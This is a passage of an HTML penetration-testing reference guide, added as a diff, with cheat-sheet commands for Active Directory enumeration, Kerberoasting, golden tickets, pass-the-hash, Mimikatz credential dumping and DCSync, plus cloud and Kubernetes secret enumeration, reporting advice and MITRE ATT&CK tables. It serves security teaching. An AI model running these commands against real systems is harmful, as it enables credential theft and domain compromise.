+│   │  │             │  │ Ticket      │  │ Key         │        │    │
+│   │  └─────────────┘  └─────────────┘  └─────────────┘        │    │
+│   └────────────────────────────────────────────────────────────┘    │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>AD Enumeration</h3>
+            <pre><code class="language-bash"># PowerView (PowerShell)
+Import-Module PowerView.ps1
+
+# Domain info
+Get-NetDomain
+Get-NetDomainController
+Get-DomainPolicy
+
+# Users and Groups
+Get-NetUser
+Get-NetUser -Username admin
+Get-NetGroup
+Get-NetGroupMember "Domain Admins"
+
+# Computers
+Get-NetComputer
+Get-NetComputer -OperatingSystem "*Server 2019*"
+
+# Trust relationships
+Get-NetDomainTrust
+Get-NetForestTrust
+
+# ACLs
+Get-ObjectAcl -SamAccountName "admin" -ResolveGUIDs
+
+# BloodHound data collection
+Sharphound.exe -c All
+# or
+Invoke-BloodHound -CollectionMethod All</code></pre>
+            
+            <h3>Kerberos Attacks</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Kerberoasting</div>
+                    <pre><code class="language-bash"># Rubeus
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Impacket
+python GetUserSPNs.py domain/user:password -dc-ip dc_ip -outputfile hashes.txt
+
+# Crack with hashcat
+hashcat -m 13100 hashes.txt wordlist.txt</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">AS-REP Roasting</div>
+                    <pre><code class="language-bash"># Rubeus
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+
+# Impacket
+python GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+
+# Crack
+hashcat -m 18200 hashes.txt wordlist.txt</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Golden Ticket</div>
+                    <pre><code class="language-bash"># Need: krbtgt hash
+mimikatz # lsadump::lsa /inject /name:krbtgt
+
+# Create golden ticket
+mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /user:Administrator
+
+# Use ticket
+mimikatz # kerberos::ptt ticket.kirbi</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Pass-the-Hash</div>
+                    <pre><code class="language-bash"># CrackMapExec
+crackmapexec smb target -u admin -H 'NTHASH'
+
+# Impacket PsExec
+python psexec.py -hashes :NTHASH domain/user@target
+
+# Mimikatz
+sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash</code></pre>
+                </div>
+            </div>
+            
+            <h3>Mimikatz Essentials</h3>
+            <pre><code class="language-bash"># Privilege debug
+mimikatz # privilege::debug
+
+# Extract credentials from LSASS
+mimikatz # sekurlsa::logonpasswords
+
+# Extract from SAM
+mimikatz # lsadump::sam
+
+# Extract from NTDS.dit (DC)
+mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
+
+# Export tickets
+mimikatz # sekurlsa::tickets /export
+
+# Pass the ticket
+mimikatz # kerberos::ptt ticket.kirbi
+
+# Dump cached credentials
+mimikatz # lsadump::cache</code></pre>
+        </section>
+
+        <!-- Section 13: Cloud Security -->
+        <section class="section">
+            <h2>Cloud Security Testing</h2>
+            <p>Cloud environments require specialized security testing approaches. Understanding cloud-specific vulnerabilities and tools is essential for modern penetration testing.</p>
+            
+            <h3>AWS Security Testing</h3>
+            <pre><code class="language-bash"># AWS CLI enumeration
+aws sts get-caller-identity
+aws iam get-user
+aws iam list-users
+aws iam list-roles
+aws s3 ls
+aws ec2 describe-instances
+
+# Pacu - AWS exploitation framework
+pacu
+(Pacu) import_keys --access-key-id AKIA... --secret-access-key ...
+(Pacu) run enumeration
+(Pacu) run lambda__enum
+(Pacu) run ec2__enum
+
+# ScoutSuite - Multi-cloud security assessment
+scout aws --profile default
+
+# Prowler - AWS security assessments
+./prowler -g cislevel1
+./prowler -g cislevel2
+
+# CloudSploit (node.js)
+./index.js -c config.js</code></pre>
+            
+            <h3>Common Cloud Vulnerabilities</h3>
+            <table>
+                <tr>
+                    <th>Cloud Service</th>
+                    <th>Common Misconfigurations</th>
+                    <th>Testing Tools</th>
+                </tr>
+                <tr>
+                    <td>Storage (S3, Blob)</td>
+                    <td>Public access, Missing encryption, Poor policies</td>
+                    <td>s3scanner, GrayhatWarfare</td>
+                </tr>
+                <tr>
+                    <td>IAM</td>
+                    <td>Over-privileged roles, Default credentials</td>
+                    <td>Pacu, IAM Silverback</td>
+                </tr>
+                <tr>
+                    <td>Compute</td>
+                    <td>Public IPs, Weak SSH keys, Metadata exposure</td>
+                    <td>Metabigor, IMDSv2 testing</td>
+                </tr>
+                <tr>
+                    <td>Containers</td>
+                    <td>Privileged containers, Insecure registries</td>
+                    <td>Trivy, Clair, Dagda</td>
+                </tr>
+                <tr>
+                    <td>Serverless</td>
+                    <td>Environment variables, Dependency vulnerabilities</td>
+                    <td>LambdaGuard, PureSec</td>
+                </tr>
+            </table>
+            
+            <h3>Container Security</h3>
+            <pre><code class="language-bash"># Docker security assessment
+docker scout cves image_name:tag
+docker history image_name:tag
+docker inspect container_id
+
+# Container escape checks
+# Check for privileged mode
+cat /proc/1/cgroup
+fdisk -l
+
+# Kubernetes enumeration
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl auth can-i --list
+
+# Kubelet API (unauthenticated)
+curl -k https://node_ip:10250/pods
+
+# Container scanning tools
+trivy image image_name:tag
+clair-scanner image_name:tag
+grype image_name:tag</code></pre>
+        </section>
+
+        <!-- Section 14: Reporting -->
+        <section class="section">
+            <h2>Penetration Testing Report</h2>
+            <p>The penetration testing report is the deliverable that communicates findings, risks, and recommendations to stakeholders. A well-structured report is essential for effective remediation.</p>
+            
+            <h3>Report Structure</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                PENETRATION TEST REPORT STRUCTURE                     │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   1. EXECUTIVE SUMMARY                                               │
+│      • Project overview and scope                                   │
+│      • Key findings summary                                          │
+│      • Risk rating overview                                          │
+│      • Business impact                                               │
+│                                                                      │
+│   2. METHODOLOGY                                                     │
+│      • Testing approach (PTES, OSSTMM, NIST)                        │
+│      • Tools used                                                    │
+│      • Timeline and scope                                            │
+│                                                                      │
+│   3. TECHNICAL FINDINGS                                              │
+│      • Vulnerability description                                     │
+│      • Risk rating (CVSS)                                            │
+│      • Evidence (screenshots, logs)                                  │
+│      • Reproduction steps                                            │
+│      • Remediation recommendations                                   │
+│                                                                      │
+│   4. ATTACK NARRATIVE                                                │
+│      • Step-by-step attack walkthrough                              │
+│      • Data accessed                                                 │
+│      • Systems compromised                                           │
+│                                                                      │
+│   5. REMEDIATION SUMMARY                                             │
+│      • Prioritized action items                                      │
+│      • Resource requirements                                         │
+│      • Timeline recommendations                                      │
+│                                                                      │
+│   6. APPENDICES                                                      │
+│      • Full scan results                                             │
+│      • Tool outputs                                                  │
+│      • Raw data                                                      │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Risk Rating Matrix</h3>
+            <table>
+                <tr>
+                    <th>Severity</th>
+                    <th>CVSS Range</th>
+                    <th>Description</th>
+                    <th>Remediation Priority</th>
+                </tr>
+                <tr>
+                    <td class="severity-critical">Critical</td>
+                    <td>9.0 - 10.0</td>
+                    <td>Immediate threat to business operations, data breach possible</td>
+                    <td>Immediate (24-48 hours)</td>
+                </tr>
+                <tr>
+                    <td class="severity-high">High</td>
+                    <td>7.0 - 8.9</td>
+                    <td>Significant risk, potential for serious compromise</td>
+                    <td>High (1-2 weeks)</td>
+                </tr>
+                <tr>
+                    <td class="severity-medium">Medium</td>
+                    <td>4.0 - 6.9</td>
+                    <td>Moderate risk, should be addressed</td>
+                    <td>Medium (1 month)</td>
+                </tr>
+                <tr>
+                    <td class="severity-low">Low</td>
+                    <td>0.1 - 3.9</td>
+                    <td>Minor risk, low impact</td>
+                    <td>Low (3 months)</td>
+                </tr>
+            </table>
+            
+            <h3>Report Writing Tools</h3>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="name">Dradis</div>
+                    <div class="desc">Collaboration and reporting platform</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Pwndoc</div>
+                    <div class="desc">Open-source pentest reporting</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">CherryTree</div>
+                    <div class="desc">Note-taking and documentation</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Obsidian</div>
+                    <div class="desc">Knowledge management</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">DefectDojo</div>
+                    <div class="desc">Vulnerability management</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Serpico</div>
+                    <div class="desc">Simple report generation</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 15: MITRE ATT&CK -->
+        <section class="section">
+            <h2>MITRE ATT&CK Framework</h2>
+            <p>MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides a common language for security teams.</p>
+            
+            <h3>ATT&CK Enterprise Tactics</h3>
+            <div class="attack-flow">
+                <span class="step">Reconnaissance</span>
+                <span class="arrow">→</span>
+                <span class="step">Resource Dev</span>
+                <span class="arrow">→</span>
+                <span class="step">Initial Access</span>
+                <span class="arrow">→</span>
+                <span class="step">Execution</span>
+                <span class="arrow">→</span>
+                <span class="step">Persistence</span>
+            </div>
+            <div class="attack-flow">
+                <span class="step">Priv Escalation</span>
+                <span class="arrow">→</span>
+                <span class="step">Defense Evasion</span>
+                <span class="arrow">→</span>
+                <span class="step">Credential Access</span>
+                <span class="arrow">→</span>
+                <span class="step">Discovery</span>
+                <span class="arrow">→</span>
+                <span class="step">Lateral Movement</span>
+            </div>
+            <div class="attack-flow">
+                <span class="step">Collection</span>
+                <span class="arrow">→</span>
+                <span class="step">Command & Control</span>
+                <span class="arrow">→</span>
+                <span class="step">Exfiltration</span>
+                <span class="arrow">→</span>
+                <span class="step">Impact</span>
+            </div>
+            
+            <div class="mitre-box">
+                <h4>Common ATT&CK Techniques</h4>
+                <table>
+                    <tr>
+                        <th>Tactic</th>
+                        <th>Technique ID</th>
+                        <th>Technique Name</th>
+                    </tr>
+                    <tr>
+                        <td>Initial Access</td>
+                        <td>T1566</td>
+                        <td>Phishing</td>
+                    </tr>
+                    <tr>
+                        <td>Execution</td>
+                        <td>T1059</td>
+                        <td>Command and Scripting Interpreter</td>
+                    </tr>
+                    <tr>
+                        <td>Persistence</td>
+                        <td>T1053</td>
+                        <td>Scheduled Task/Job</td>
+                    </tr>
+                    <tr>
+                        <td>Privilege Escalation</td>
+                        <td>T1068</td>
+                        <td>Exploitation for Privilege Escalation</td>
+                    </tr>
+                    <tr>
+                        <td>Defense Evasion</td>
+                        <td>T1070</td>
+                        <td>Indicator Removal</td>
+                    </tr>
+                    <tr>
+                        <td>Credential Access</td>
+                        <td>T1003</td>
+                        <td>OS Credential Dumping</td>
+                    </tr>
+                    <tr>
+                        <td>Lateral Movement</td>
+                        <td>T1021</td>
+                        <td>Remote Services</td>
+                    </tr>
+                    <tr>
+                        <td>Command & Control</td>
+                        <td>T1071</td>
+                        <td>Application Layer Protocol</td>
+                    </tr>
+                </table>
+            </div>
+        </section>
+
+        <!-- Section 16: Tools Quick Reference -->
+        <section class="section">
+            <h2>Essential Tools Reference</h2>
+            <p>A comprehensive quick reference for the most commonly used tools in penetration testing and security assessments.</p>
+            
+            <h3>Reconnaissance Tools</h3>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="name">Nmap</div>
+                    <div class="desc">Network scanning and discovery</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Shodan</div>
+                    <div class="desc">Internet-connected device search</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Amass</div>
+                    <div class="desc">Subdomain enumeration</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Subfinder</div>
+                    <div class="desc">Passive subdomain discovery</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Maltego</div>
+                    <div class="desc">OSINT visualization</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">theHarvester</div>
+                    <div class="desc">Email and subdomain gathering</div>
+                </div>
+            </div>
+            
+            <h3>Web Application Tools</h3>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="name">Burp Suite</div>
+                    <div class="desc">Web application testing</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">OWASP ZAP</div>
+                    <div class="desc">Free web scanner</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">SQLMap</div>
+                    <div class="desc">SQL injection automation</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Nikto</div>
+                    <div class="desc">Web server scanner</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Gobuster</div>
+                    <div class="desc">Directory bruteforce</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">ffuf</div>
+                    <div class="desc">Fast web fuzzer</div>
+                </div>
+            </div>
+            
+            <h3>Exploitation Tools</h3>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="name">Metasploit</div>
+                    <div class="desc">Exploitation framework</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Searchsploit</div>
+                    <div class="desc">Exploit database search</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">msfvenom</div>
+                    <div class="desc">Payload generator</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Impacket</div>
+                    <div class="desc">Network protocol tools</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">CrackMapExec</div>
+                    <div class="desc">Post-exploitation</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Empire</div>
+                    <div class="desc">PowerShell post-exploitation</div>
+                </div>
+            </div>
+            
+            <h3>Password Cracking Tools</h3>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="name">Hashcat</div>
+                    <div class="desc">GPU password cracker</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">John the Ripper</div>
+                    <div class="desc">Password cracker</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Hydra</div>
+                    <div class="desc">Online password attack</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Medusa</div>
+                    <div class="desc">Parallel login brute-forcer</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">Mimikatz</div>
+                    <div class="desc">Windows credential extraction</div>
+                </div>
+                <div class="tool-card">
+                    <div class="name">LaZagne</div>
+                    <div class="desc">Multi-platform password recovery</div>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>🛡️ Cyber Security & Penetration Testing Mastery Guide</p>
+            <p>Always practice ethical hacking | Get proper authorization | Follow responsible disclosure</p>
+        </footer>
+    </div>
+    
+    <script>
+        // Smooth scroll for navigation
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+        
+        // Add animation on scroll
+        const sections = document.querySelectorAll('.section');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        sections.forEach(section => {
+            section.style.opacity = '0';
+            section.style.transform = 'translateY(20px)';
+            section.style.transition = 'all 0.5s ease-out';
+            observer.observe(section);
+        });
+        
+        // Code copy functionality
+        document.querySelectorAll('pre').forEach(block => {
+            block.addEventListener('click', () => {
+                const code = block.textContent;
+                navigator.clipboard.writeText(code).then(() => {
+                    const notification = document.createElement('div');
+                    notification.textContent = 'Copied!';
+                    notification.style.cssText = `
+                        position: fixed;
+                        bottom: 20px;
+                        right: 20px;
+                        background: #00ff88;
+                        color: #000;
+                        padding: 10px 20px;
+                        border-radius: 5px;
+                        font-family: 'JetBrains Mono', monospace;
+                        z-index: 1000;
+                    `;
+                    document.body.appendChild(notification);
+                    setTimeout(() => notification.remove(), 2000);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
